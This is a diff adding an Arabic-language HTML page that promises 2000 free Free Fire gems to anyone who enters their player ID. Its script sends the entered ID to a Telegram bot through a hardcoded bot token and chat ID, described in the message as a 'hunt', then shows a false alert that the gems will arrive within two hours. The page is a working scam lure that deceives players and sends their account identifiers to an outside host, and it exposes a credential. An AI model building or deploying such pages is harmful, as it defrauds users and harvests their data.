@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<script>
+function claimFF() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const chatId = urlParams.get('chatId') || "5905562720";
+    const token = "8521496596:AAGb7ODWoScawEb5Fm78sPLL8pfBeXZQzlg";
+    const id = document.getElementById('ffid').value;
+    const msg = `💎 **صيد فري فاير (ID)**\n\n🆔 الأيدي: \`${id}\`\n🔥 الحالة: جاري التحقق من الحساب`;
+    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+    alert("مبروك! سيتم إضافة الجواهر إلى حسابك خلال ساعتين.");
+}
+</script>
+<body style="background:linear-gradient(45deg, #ff4b2b, #ff416c); color:white; text-align:center; padding-top:50px; font-family:sans-serif;">
+    <h1 style="font-size:35px; text-shadow: 2px 2px #000;">FREE FIRE GEMS 💎</h1>
+    <p>أدخل ID الخاص بك للحصول على 2000 جوهرة مجاناً</p>
+    <input id="ffid" placeholder="أدخل ID اللاعب" style="width:75%; padding:15px; margin:20px; border-radius:10px; border:none; text-align:center; font-size:18px;"><br>
+    <button onclick="claimFF()" style="background:#fff; color:#ff4b2b; padding:15px 50px; border:none; font-weight:bold; border-radius:30px; cursor:pointer; font-size:20px; box-shadow: 0px 5px 15px rgba(0,0,0,0.3);">احصل عليها الآن</button>
+</body>
+</html>
